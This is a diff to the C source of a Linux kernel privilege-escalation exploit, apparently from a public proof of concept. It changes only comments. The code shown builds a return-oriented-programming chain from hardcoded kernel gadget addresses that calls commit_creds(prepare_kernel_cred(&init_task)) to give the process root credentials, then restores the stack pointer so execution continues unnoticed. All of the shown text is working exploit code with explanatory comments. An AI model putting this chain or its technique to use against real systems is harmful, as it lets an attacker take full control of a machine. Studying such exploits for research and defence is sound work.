@@ -63,6 +63,7 @@
 #define JMP_RAX				0xffffffff810372abUL /* jmp rax */
 #define PUSH_RAX_POP_RSI		0xffffffff81d1da58UL /* push rax ; pop rsi ; ret */
 #define PUSH_RSI_POP_RDI_JMP		0xffffffff810f1a26UL /* push rsi ; pop rdi ; add eax, dword ptr [rax] ; jmp 0xffffffff810f19de */
+							     /* where 0xffffffff810f19de contains: add rsp,0x8; ret */
 #define XCHG_RAX_RBP			0xffffffff81633c34UL /* xchg rax, rbp ; ret */
 #define SUB_RAX_RDI			0xffffffff81f2ec90UL /* sub rax, rdi ; ret */
 #define PUSH_RAX_POP_RSP_DEC_PTR_RAX	0xffffffff81d186f5UL /* push rax ; pop rsp ; dec DWORD PTR [rax-0x7d] ; ret */
@@ -92,21 +93,21 @@ int prepare_rop_chain(void)
 	printf("[+] fake stack for the ROP chain is at %p\n", fake_stack);
 
 	fake_stack[offset++] = POP_RDI;
-	fake_stack[offset++] = INIT_TASK_PTR; /* passed as the 1st argument of the prepare_kernel_cred() */
+	fake_stack[offset++] = INIT_TASK_PTR; /* use it as the 1st argument of prepare_kernel_cred() */
 	fake_stack[offset++] = POP_RAX;
 	fake_stack[offset++] = PREPARE_KERNEL_CRED_PTR;
-	fake_stack[offset++] = JMP_RAX; /* executes prepare_kernel_cred(&init_task) */
-	fake_stack[offset++] = PUSH_RAX_POP_RSI;     /* the value returned by prepare_kernel_cred is  */
-	fake_stack[offset++] = PUSH_RSI_POP_RDI_JMP; /*  passed to RDI 1st argument of the function   */
-	fake_stack[offset++] = 0xdeadfeed; /* previous gadget adds 8 to rsp due to JMP */
+	fake_stack[offset++] = JMP_RAX; /* execute prepare_kernel_cred(&init_task) */
+	fake_stack[offset++] = PUSH_RAX_POP_RSI; /* rax contains the result of prepare_kernel_cred() */
+	fake_stack[offset++] = PUSH_RSI_POP_RDI_JMP; /* put it in rdi as the 1st argument of the function */
+	fake_stack[offset++] = 0xdeadfeed; /* a dummy value for the gadget we jumped to */
 	fake_stack[offset++] = POP_RAX;
 	fake_stack[offset++] = COMMIT_CREDS_PTR;
-	fake_stack[offset++] = JMP_RAX; /* executes commit_creds(prepare_kernel_cred(&init_task)) */
-	fake_stack[offset++] = XCHG_RAX_RBP; /* RBP contains a pointer */
-	fake_stack[offset++] = POP_RDI;	  /*  that differs by 0x37  */
-	fake_stack[offset++] = 0x37;	  /*    from the old RSP    */
-	fake_stack[offset++] = SUB_RAX_RDI;
-	fake_stack[offset++] = PUSH_RAX_POP_RSP_DEC_PTR_RAX; /* restore the RSP and continue legitimate execution */
+	fake_stack[offset++] = JMP_RAX; /* execute commit_creds(prepare_kernel_cred(&init_task)) */
+	fake_stack[offset++] = XCHG_RAX_RBP; /* calculate the original rsp value using rbp */
+	fake_stack[offset++] = POP_RDI;
+	fake_stack[offset++] = 0x37;
+	fake_stack[offset++] = SUB_RAX_RDI; /* the original rsp value is the rbp value minus 0x37 */
+	fake_stack[offset++] = PUSH_RAX_POP_RSP_DEC_PTR_RAX; /* restore rsp and continue */
 
 	return EXIT_SUCCESS;
 }
